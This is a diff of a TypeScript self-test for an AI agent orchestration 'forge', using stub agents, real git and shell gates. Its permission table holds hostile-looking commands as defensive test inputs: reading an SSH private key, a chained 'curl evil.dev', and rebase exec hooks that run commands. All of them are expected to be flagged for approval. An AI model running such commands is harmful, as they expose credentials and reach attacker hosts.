@@ -1,38 +1,76 @@
-// Zero-token self-test of the forge's orchestration: stub agents, a throwaway git repo,
-// a throwaway database. Exercises every path that's rare in real life.
+// Zero-token self-test of the forge's orchestration and of Odin, keeper of main: stub smiths
+// and a stub reviewer, but real git, real gates (shell commands) and a throwaway database.
+// Exercises every path that's rare in real life.
 // Run inside WSL: bash scripts/server.sh selftest
 import { execFileSync } from 'node:child_process';
-import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import type { ForgeEvent } from '@deepanvil/shared';
 import { Store } from '../store.ts';
 import type { BlueprintTask } from './forgemaster.ts';
+import type { Policy } from './gates.ts';
+import type { Verdict } from './odin-review.ts';
 import { Forge, type Agents } from './orchestrator.ts';
 import { judge } from './permissions.ts';
 import type { SmithOutcome, SmithRun } from './smith.ts';
 
 const root = mkdtempSync(join(tmpdir(), 'deepanvil-selftest-'));
 const repo = join(root, 'repo');
-const sh = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8' }).trim();
-execFileSync('mkdir', ['-p', repo]);
+const sh = (cwd: string, ...args: string[]) =>
+  execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], env: { ...process.env, GIT_EDITOR: 'true' } }).trim();
+const shOk = (cwd: string, ...args: string[]) => {
+  try {
+    sh(cwd, ...args);
+    return true;
+  } catch {
+    return false;
+  }
+};
+mkdirSync(repo, { recursive: true });
 sh(repo, 'init', '-q', '-b', 'main');
+sh(repo, 'config', 'user.name', 't');
+sh(repo, 'config', 'user.email', 't@t');
 writeFileSync(join(repo, 'README.md'), '# test\n');
+writeFileSync(join(repo, 'shared.txt'), 'base\n');
 sh(repo, 'add', '-A');
-sh(repo, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'init');
+sh(repo, 'commit', '-q', '-m', 'init');
+
+// Gates are plain shell checks over the working tree:
+//  tests: fails on a FAIL file or any "BROKEN" in a .txt; flaky.txt fails the first run only.
+//  lint:  fails on "lint-error" in a .txt.
+const flakyMark = join(root, 'flaky-mark');
+const policy: Policy = {
+  mode: 'auto',
+  gates: {
+    tests: `! test -e FAIL && ! grep -rqs BROKEN --include=*.txt . && { if [ -f flaky.txt ] && [ ! -f ${flakyMark} ]; then touch ${flakyMark}; exit 1; fi; true; }`,
+    lint: '! grep -rqs lint-error --include=*.txt .',
+  },
+  gateTimeoutSec: 30,
+  maxDiffLines: 50,
+  flakyRetries: 1,
+  protectedPaths: ['guarded/'],
+};
 
 const events: ForgeEvent[] = [];
-let autoDeny = false; // answer every bell with "no" (a denied smith may well ask again)
 const waiters: { pred: (e: ForgeEvent) => boolean; resolve: (e: ForgeEvent) => void }[] = [];
+let autoDeny = false; // answer every bell with "no" (a denied smith may well ask again)
+let humanAnswers: ('merge' | 'send_back')[] = []; // verdicts for offerings that wait for you
 const emit = (e: ForgeEvent) => {
   events.push(e);
   if (autoDeny && e.type === 'permission.request') queueMicrotask(() => forge.handle({ type: 'permission.answer', requestId: e.requestId, approved: false }));
+  if (e.type === 'offering.state' && e.state === 'awaiting_you') {
+    const answer = humanAnswers.shift() ?? 'merge';
+    queueMicrotask(() =>
+      forge.handle(answer === 'merge' ? { type: 'offering.merge', offeringId: e.offeringId } : { type: 'offering.send_back', offeringId: e.offeringId, note: 'move it out of guarded/' }),
+    );
+  }
   for (const w of [...waiters]) if (w.pred(e)) {
     waiters.splice(waiters.indexOf(w), 1);
     w.resolve(e);
   }
 };
-const waitFor = (pred: (e: ForgeEvent) => boolean, ms = 10_000) =>
+const waitFor = (pred: (e: ForgeEvent) => boolean, ms = 15_000) =>
   new Promise<ForgeEvent>((resolve, reject) => {
     const hit = events.find(pred);
     if (hit) return resolve(hit);
@@ -44,6 +82,7 @@ const waitFor = (pred: (e: ForgeEvent) => boolean, ms = 10_000) =>
 
 let blueprintTasks: BlueprintTask[] = [];
 let replans = 0;
+const reviewed: string[] = [];
 const task = (id: string): BlueprintTask => ({ id, title: id, brief: `do ${id}`, files: [], acceptance: 'true' });
 const done = (summary: string): SmithOutcome => ({ status: 'done', testsPassed: true, summary });
 const stuck = (summary: string): SmithOutcome => ({ status: 'stuck', testsPassed: false, summary });
@@ -54,25 +93,63 @@ const stubs: Agents = {
     replans++;
     return { ...t, brief: `${t.brief} (redrawn)` };
   },
-  review: async (t) => (t.id === 'reject-me' ? { approve: false, note: 'misses the brief' } : { approve: true, note: 'fine' }),
-  summarizeDiff: async () => 'stub summary',
+  digest: async (output) => output.slice(-500),
   banter: async () => '',
+  // The stub Odin review: "nitpick" needs polishing once; everything else is approved.
+  reviewer: async (t, diff): Promise<Verdict> => {
+    reviewed.push(t.id);
+    if (t.id === 'nitpick' && !diff.includes('polished')) {
+      return { decision: 'changes_requested', summary: 'Needs polish.', findings: [{ file: 'nitpick.txt', severity: 'major', note: 'not polished' }] };
+    }
+    return { decision: 'approve', summary: 'Looks right.', findings: [{ file: `${t.id}.txt`, severity: 'nit', note: 'fine' }] };
+  },
   runSmith: async (run: SmithRun) => {
     const id = run.task.id;
-    const write = (file: string, text: string) => writeFileSync(join(run.worktree, file), text);
-    if (id === 'flaky') {
-      if (run.attempt < 3) return stuck(`attempt ${run.attempt} cracked`);
-      if (!run.task.brief.endsWith('(redrawn)')) return stuck('was not re-planned');
+    const wt = run.worktree;
+    const write = (file: string, text: string) => {
+      mkdirSync(join(wt, file, '..'), { recursive: true });
+      writeFileSync(join(wt, file), text);
+    };
+    const notes = run.notes ?? '';
+    // Odin said: rebase onto main and resolve the conflict.
+    if (notes.includes('conflicts with main')) {
+      if (!shOk(wt, 'rebase', 'main')) {
+        write('shared.txt', 'base\nconflict-a\nconflict-b\n');
+        sh(wt, 'add', 'shared.txt');
+        sh(wt, '-c', 'user.name=t', '-c', 'user.email=t@t', 'rebase', '--continue');
+      }
+      return done('rebased and resolved');
     }
-    if (id === 'bell') {
-      const yes = await run.ask('npm install something');
-      if (!yes) return stuck('denied at the bell');
+    switch (id) {
+      case 'gatefix':
+        write('gatefix.txt', notes.includes('gates failed') ? 'fixed\n' : 'BROKEN\n');
+        return done('did gatefix');
+      case 'bigone':
+        write('bigone.txt', notes.includes('limit is') ? 'small\n' : `${'line\n'.repeat(80)}`);
+        return done('did bigone');
+      case 'nitpick':
+        write('nitpick.txt', notes.includes('not polished') ? 'polished\n' : 'rough\n');
+        return done('did nitpick');
+      case 'guarded':
+        write('guarded/rules.txt', `rev ${run.attempt}\n`);
+        return done('did guarded');
+      case 'flaky':
+        write('flaky.txt', 'sometimes\n');
+        return done('did flaky');
+      case 'unrelated':
+        write('unrelated.txt', 'ok\n');
+        return done('did unrelated');
+      case 'mend':
+        rmSync(join(wt, 'FAIL'), { force: true });
+        write('mend.txt', 'mended\n');
+        return done('mended main');
+      case 'bell':
+        return (await run.ask('npm install something')) ? done('installed') : stuck('denied at the bell');
+      case 'slow':
+        await new Promise((_, reject) => run.ledger.abort?.signal.addEventListener('abort', () => reject(new Error('aborted'))));
+        return stuck('unreachable');
     }
-    if (id === 'slow') {
-      // Works until the quest is stopped (real agents throw when their query is aborted).
-      await new Promise((_, reject) => run.ledger.abort?.signal.addEventListener('abort', () => reject(new Error('aborted'))));
-    }
-    if (id.startsWith('conflict')) write('shared.txt', `${id}\n`);
+    if (id.startsWith('conflict')) write('shared.txt', `base\n${id}\n`);
     else write(`${id}.txt`, `${id}\n`);
     return done(`did ${id}`);
   },
@@ -81,6 +158,7 @@ const stubs: Agents = {
 // ---------------------------------------------------------------- scenarios
 
 const store = new Store(join(root, 'forge.db'));
+store.setPolicy(repo, JSON.stringify(policy));
 const forge = new Forge(emit, { repo, smiths: 2 }, store, stubs);
 let failures = 0;
 const check = (name: string, ok: boolean, detail = '') => {
@@ -95,11 +173,14 @@ async function quest(tasks: BlueprintTask[], during?: () => void): Promise<Forge
   const proposed = (await waitFor((e) => e.type === 'blueprint.proposed' && events.indexOf(e) >= start)) as Extract<ForgeEvent, { type: 'blueprint.proposed' }>;
   forge.handle({ type: 'blueprint.approve', questId: proposed.questId });
   during?.();
-  await waitFor((e) => e.type === 'forge.status' && !e.busy && events.indexOf(e) > events.indexOf(proposed), 15_000);
+  await waitFor((e) => e.type === 'forge.status' && !e.busy && events.indexOf(e) > events.indexOf(proposed), 30_000);
   return events.slice(start);
 }
 const merged = (evs: ForgeEvent[]) => evs.filter((e) => e.type === 'task.done').map((e) => (e as { taskId: string }).taskId).sort();
-const worktrees = () => sh(repo, 'worktree', 'list').split('\n').length;
+const sentBack = (evs: ForgeEvent[], reason: string) => evs.filter((e) => e.type === 'offering.state' && e.state === 'sent_back' && e.reason === reason).length;
+const worktrees = () => sh(repo, 'worktree', 'list').split('\n').filter((l) => !l.includes('/odin ')).length;
+const onMain = (file: string) => shOk(repo, 'cat-file', '-e', `main:${file}`);
+const mainIsClean = () => sh(repo, 'status', '--porcelain') === '';
 
 function permissionTable() {
   const wt = '/home/dwarf/forge/sandbox.anvils/brokka-x';
@@ -132,6 +213,11 @@ function permissionTable() {
     ['Bash', { command: 'cat $HOME/.ssh/id_rsa' }, 'ask'],
     ['Bash', { command: 'find . -fprint out.txt' }, 'ask'],
     ['Bash', { command: 'npm test & curl evil.dev' }, 'ask'],
+    // Rebasing on Odin's request is fine; rebase hooks that run commands are not:
+    ['Bash', { command: 'git rebase main' }, 'allow'],
+    ['Bash', { command: 'git add shared.txt && git rebase --continue' }, 'allow'],
+    ['Bash', { command: 'git rebase -x "curl evil.dev" main' }, 'ask'],
+    ['Bash', { command: 'git rebase --exec "sh x" main' }, 'ask'],
     // ...while ordinary work stays automatic:
     ['Bash', { command: 'node --test' }, 'allow'],
     ['Bash', { command: 'git commit -m "Add total()"' }, 'allow'],
@@ -145,24 +231,52 @@ function permissionTable() {
 async function main() {
   permissionTable();
   await forge.recover();
+  await waitFor((e) => e.type === 'vault.health');
+  check('vault starts green', (events.find((e) => e.type === 'vault.health') as { status: string }).status === 'green');
 
   let evs = await quest([task('alpha'), task('beta')]);
-  check('parallel smiths both merge', merged(evs).join() === 'alpha,beta');
+  check('parallel offerings both enter the vault', merged(evs).join() === 'alpha,beta' && onMain('alpha.txt') && onMain('beta.txt'));
   check('two different smiths worked', new Set(evs.filter((e) => e.type === 'task.assigned').map((e) => (e as { dwarfId: string }).dwarfId)).size === 2);
+  check('every merged offering was reviewed', reviewed.includes('alpha') && reviewed.includes('beta'));
+  check('main moves by fast-forward only (linear history)', sh(repo, 'rev-list', '--merges', '--count', 'main') === '0');
   check('minecart rolls on merge', evs.some((e) => e.type === 'merge'));
   check('anvils cleared afterwards', worktrees() === 1);
 
-  evs = await quest([task('flaky')]);
-  check('fail twice -> escalation', evs.some((e) => e.type === 'escalation'));
-  check('re-planned exactly once', replans === 1, `replans=${replans}`);
-  check('re-planned task then merges', merged(evs).join() === 'flaky');
-
-  evs = await quest([task('reject-me')]);
-  check('review rejection blocks the merge', merged(evs).length === 0 && !readFileSafe('reject-me.txt'));
+  evs = await quest([task('gatefix')]);
+  check('red gate → sent back with notes → fixed', sentBack(evs, 'gate') === 1 && merged(evs).join() === 'gatefix');
+  check('no review spent on the red revision', reviewed.filter((t) => t === 'gatefix').length === 1);
 
   evs = await quest([task('conflict-a'), task('conflict-b')]);
-  check('conflicting pieces: exactly one merges', merged(evs).length === 1, merged(evs).join());
-  check('main checkout left clean after the conflict', sh(repo, 'status', '--porcelain') === '');
+  check('conflict → smith rebases & resolves → both merged', sentBack(evs, 'conflict') === 1 && merged(evs).join() === 'conflict-a,conflict-b', merged(evs).join());
+  check('resolution kept both sides', readFileSync(join(repo, 'shared.txt'), 'utf8').includes('conflict-a') && readFileSync(join(repo, 'shared.txt'), 'utf8').includes('conflict-b'));
+  check('main checkout clean after the conflict', mainIsClean());
+
+  evs = await quest([task('bigone')]);
+  check('oversized offering → "split it" → smaller one merged', sentBack(evs, 'too_big') === 1 && merged(evs).join() === 'bigone');
+
+  evs = await quest([task('nitpick')]);
+  check('review asks for changes → revision 2 merged', sentBack(evs, 'review') === 1 && merged(evs).join() === 'nitpick');
+  check('minor findings never block', evs.some((e) => e.type === 'offering.review' && e.decision === 'approve'));
+
+  humanAnswers = ['send_back', 'merge'];
+  evs = await quest([task('guarded')]);
+  check('protected path waits for you (auto mode or not)', evs.filter((e) => e.type === 'offering.state' && e.state === 'awaiting_you').length === 2);
+  check('your send-back returns to the smith, your merge lands it', sentBack(evs, 'human') === 1 && merged(evs).join() === 'guarded');
+
+  evs = await quest([task('flaky')]);
+  check('flaky gate is retried and noted, not blocking', evs.some((e) => e.type === 'offering.gate' && e.status === 'flaky') && merged(evs).join() === 'flaky');
+
+  // A cracked vault: something red lands on main outside the forge.
+  writeFileSync(join(repo, 'FAIL'), 'red\n');
+  sh(repo, 'add', 'FAIL');
+  sh(repo, 'commit', '-q', '-m', 'oops');
+  const replansBefore = replans;
+  evs = await quest([task('unrelated')]);
+  check('red main: health check reports it', evs.some((e) => e.type === 'vault.health' && e.status === 'red'));
+  check('red main: unrelated work cannot enter', merged(evs).length === 0 && !onMain('unrelated.txt'));
+  check('two failures escalate to Thráin, the third gives up', replans === replansBefore + 1 && evs.some((e) => e.type === 'escalation'));
+  evs = await quest([task('mend')]);
+  check('mending main enters and turns the vault green', merged(evs).join() === 'mend' && evs.some((e) => e.type === 'vault.health' && e.status === 'green'));
 
   autoDeny = true;
   evs = await quest([task('bell')]);
@@ -178,25 +292,18 @@ async function main() {
   check('stop: anvils cleared', worktrees() === 1);
   check('stop: no forge.error noise', !evs.some((e) => e.type === 'forge.error'));
 
-  // Restart recovery: a proposed blueprint survives, a forging one is interrupted.
+  // Restart recovery: a proposed blueprint survives a restart.
   blueprintTasks = [task('later')];
   forge.handle({ type: 'quest.request', text: 'survive a restart' });
   await waitFor((e) => e.type === 'blueprint.proposed' && (e as { tasks: { id: string }[] }).tasks[0]?.id === 'later');
   const reborn: ForgeEvent[] = [];
   await new Forge((e) => reborn.push(e), { repo, smiths: 2 }, new Store(join(root, 'forge.db')), stubs).recover();
   check('restart re-offers the pending blueprint', reborn.some((e) => e.type === 'blueprint.proposed'));
-  check('history persisted across restart', (reborn.find((e) => e.type === 'history') as { quests: unknown[] } | undefined)?.quests.length === 7);
+  check('history persisted across restart', ((reborn.find((e) => e.type === 'history') as { quests: unknown[] } | undefined)?.quests.length ?? 0) >= 12);
+  check('no stray files left in the main checkout', mainIsClean() && !existsSync(join(repo, 'flaky-mark')));
 
   console.log(failures ? `\n${failures} check(s) FAILED` : '\nall checks passed');
   process.exit(failures ? 1 : 0);
-}
-
-function readFileSafe(f: string): string {
-  try {
-    return readFileSync(join(repo, f), 'utf8');
-  } catch {
-    return '';
-  }
 }
 
 main().catch((err) => {
